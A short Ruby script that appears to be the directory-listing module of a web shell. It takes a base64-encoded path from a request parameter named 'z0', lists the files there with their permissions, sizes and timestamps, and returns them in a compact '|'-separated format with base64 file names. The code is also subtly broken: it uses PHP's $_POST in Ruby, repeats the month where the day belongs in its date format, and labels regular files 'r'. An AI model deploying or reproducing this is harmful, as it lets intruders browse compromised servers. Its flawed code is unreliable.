require 'base64'

def fn_get_file_permission(file_path)
  begin
    stat = File.lstat(file_path)
    mode = stat.mode

    info = case
           when stat.socket?    then 's'
           when stat.symlink?   then 'l'
           when stat.file?      then 'r' # regular file
           when stat.blockdev?  then 'b'
           when stat.directory? then 'd'
           when stat.chardev?   then 'c'
           when stat.pipe?      then 'p'
           else 'u'
           end

    info += (mode & 0o0400 != 0) ? 'r' : '-'
    info += (mode & 0o0200 != 0) ? 'w' : '-'
    info += if mode & 0o0100 != 0
              (mode & 0o4000 != 0) ? 's' : 'x'
            else
              (mode & 0o4000 != 0) ? 'S' : '-'
            end

    info += (mode & 0o0040 != 0) ? 'r' : '-'
    info += (mode & 0o0020 != 0) ? 'w' : '-'
    info += if mode & 0o0010 != 0
              (mode & 0o2000 != 0) ? 's' : 'x'
            else
              (mode & 0o2000 != 0) ? 'S' : '-'
            end

    info += (mode & 0o0004 != 0) ? 'r' : '-'
    info += (mode & 0o0002 != 0) ? 'w' : '-'
    info += if mode & 0o0001 != 0
              (mode & 0o1000 != 0) ? 't' : 'x'
            else
              (mode & 0o1000 != 0) ? 'T' : '-'
            end

    info
  rescue
    "---------"
  end
end

def fn_datetime_conversion(time_obj)
  time_obj.strftime("%Y-%m-%m %H:%M:%S") rescue "1970-01-01 00:00:00"
end

begin
  sz_dir = $_POST['z0'].unpack1('m')
  
  Dir.chdir(sz_dir)
  current_dir = Dir.pwd

  a_entry = Dir.entries(current_dir)
  a_result = []

  a_entry.each do |sz_entry|
    sz_prefix = ''
    sz_prefix = '/' if File.directory?(sz_entry)

    sz_file_name = "#{sz_prefix}#{sz_entry}"
    
    sz_b64_file_name = [sz_file_name].pack('m0')
    
    sz_perm = fn_get_file_permission(sz_entry)
    
    n_length = File.size(sz_entry) rescue 0

    stat = File.lstat(sz_entry) rescue nil
    if stat
      ctime = fn_datetime_conversion(stat.ctime)
      mtime = fn_datetime_conversion(stat.mtime)
      atime = fn_datetime_conversion(stat.atime)
    else
      ctime = mtime = atime = "1970-01-01 00:00:00"
    end

    sz_result = "#{sz_b64_file_name}?#{sz_perm}?#{n_length}?#{ctime}?#{mtime}?#{atime}"
    a_result << sz_result
  end

  print a_result.join('|')

rescue => e
  print 'ERROR://Unable to open directory'
end